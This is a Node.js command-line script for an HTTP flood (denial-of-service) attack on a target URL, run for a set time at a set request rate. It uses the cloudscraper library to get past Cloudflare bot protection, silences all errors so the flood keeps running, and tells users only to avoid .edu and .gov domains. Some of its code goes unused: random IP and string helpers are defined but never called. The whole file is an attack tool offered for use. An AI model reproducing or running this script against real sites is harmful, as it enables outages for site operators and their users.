const cloudscraper = require('cloudscraper');
const request = require('request-promise-native');

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});

if (process.argv.length !== 5) {
    console.log(`[Usage] node script.js <url> <time> <requestsPerSecond>`);
    console.log(`[Example] node script.js https://example.com 60 1000`);
    console.log(`[Warning] Do not use on .edu .gov domains`);
    process.exit(-1);
}

const url = process.argv[2];
const time = Number(process.argv[3]);
const requestsPerSecond = Number(process.argv[4]);

if (!url || !time || !requestsPerSecond) {
    console.log(`Invalid input. Please provide valid values.`);
    process.exit(-1);
}

const rIp = () => {
    const r = () => Math.floor(Math.random() * 255);
    return `${r()}.${r()}.${r()}.${r()}`;
}

const rStr = (l) => {
    const a = 'abcdefghijklmnopqstuvwxyz0123456789';
    let s = '';
    for (let i = 0; i < l; i++) {
        s += a[Math.floor(Math.random() * a.length)];
    }
    return s;
}

console.log(`[Info] Starting ${time} seconds attack on ${url} with ${requestsPerSecond} requests per second`);

const attack = async () => {
    for (let i = 0; i < requestsPerSecond * time; i++) {
        try {
            await cloudscraper.get(url);
        } catch (e) {
            // Handle errors if needed
        }
    }
};

(async () => {
    await attack();
})();
                    
